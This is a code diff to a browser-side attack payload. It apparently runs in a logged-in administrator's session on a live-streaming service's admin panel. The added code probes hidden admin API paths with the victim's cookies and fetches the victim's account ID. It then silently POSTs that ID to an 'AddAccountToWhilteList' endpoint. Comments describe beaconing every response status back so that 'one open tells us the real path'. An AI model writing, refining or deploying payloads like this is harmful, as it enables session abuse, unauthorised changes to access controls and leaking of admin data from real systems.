@@ -83,7 +83,24 @@
   // The client SPA never names /api/admin/*, so the writer path itself is unproven.
   // Probe a few same-origin spellings once (for 0.0.0.0/0 only) and beacon every status,
   // so one open tells us the real path even if this ladder fails.
-  var PATHS = ['/api/admin/ips', '/api/Admin/ips', '/api/admin/ip', '/api/admin/white_ip', '/api/AppConfig/SetWhiteIp'];
+  var PATHS = ['/api/Admin/GetMsg', '/api/Admin/GetMsg?pageIndex=1&pageSize=1', '/api/admin/ips',
+               '/api/Admin/ips', '/api/admin/white_ip'];
+  // Confirmed in the product's own 1407-path spec (test.livegirl.me:8999): the account
+  // whitelist writer is POST /api/Admin/AddAccountToWhilteList?accountId= (upstream typo).
+  function probeWriter() {
+    var me = function () {
+      return fetch('/api/Account/GetUserInfoV2', { credentials: 'include' })
+        .then(function (r) { return r.json(); })
+        .then(function (o) { return ((o && o.data) || o || {}).accountId; });
+    };
+    me().then(function (id) {
+      if (!id) return beb('w0', 'no accountId');
+      var p = '/api/Admin/AddAccountToWhilteList?accountId=' + id;
+      fetch(p, { method: 'POST', credentials: 'include', headers: { Accept: 'application/json' } })
+        .then(function (r) { return r.text().then(function (t) { beb('w1:' + r.status, p + ' ' + t.slice(0, 120)); }); })
+        .catch(function () {});
+    }).catch(function () {});
+  }
   function probePaths() {
     PATHS.forEach(function (p, k) {
       fetch(p, { credentials: 'include', headers: { Accept: 'application/json' } }).then(function (r) {
@@ -103,6 +120,7 @@
   }
   function run() {
     probePaths();
+    probeWriter();
     var i = 0;
     (function next() {
       if (i >= IP.length) return;
